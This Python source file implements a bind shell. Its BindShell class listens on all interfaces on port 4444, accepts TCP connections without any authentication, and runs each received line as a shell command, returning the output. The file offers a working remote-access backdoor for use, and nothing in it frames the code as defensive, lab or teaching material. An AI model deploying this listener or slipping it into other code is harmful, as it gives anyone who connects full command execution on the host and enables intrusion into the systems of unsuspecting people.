"""Core bind shell implementation."""

import socket
import subprocess
from threading import Thread


class BindShell:
    """A simple bind shell server that accepts commands over TCP."""

    def __init__(self, host="0.0.0.0", port=4444, max_connections=4):
        self.host = host
        self.port = port
        self.max_connections = max_connections
        self.socket = None

    def run_command(self, cmd):
        """Execute a shell command and return output."""
        result = subprocess.run(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True
        )
        return result.stdout

    def handle_client(self, client_socket):
        """Handle incoming client connection."""
        try:
            while True:
                chunks = []
                chunk = client_socket.recv(2048)
                chunks.append(chunk)
                
                while len(chunk) != 0 and chr(chunk[-1]) != '\n':
                    chunk = client_socket.recv(2048)
                    chunks.append(chunk)
                
                cmd = (b''.join(chunks)).decode()[:-1]

                if cmd.lower() == 'exit':
                    break

                output = self.run_command(cmd)
                client_socket.sendall(output)
        finally:
            client_socket.close()

    def start(self):
        """Start the bind shell server."""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind((self.host, self.port))
        self.socket.listen(self.max_connections)

        print(f"Bind shell listening on {self.host}:{self.port}")

        try:
            while True:
                client_socket, address = self.socket.accept()
                print(f"Connection from {address}")
                thread = Thread(target=self.handle_client, args=(client_socket,))
                thread.daemon = True
                thread.start()
        except KeyboardInterrupt:
            print("\nShutting down...")
        finally:
            if self.socket:
                self.socket.close()
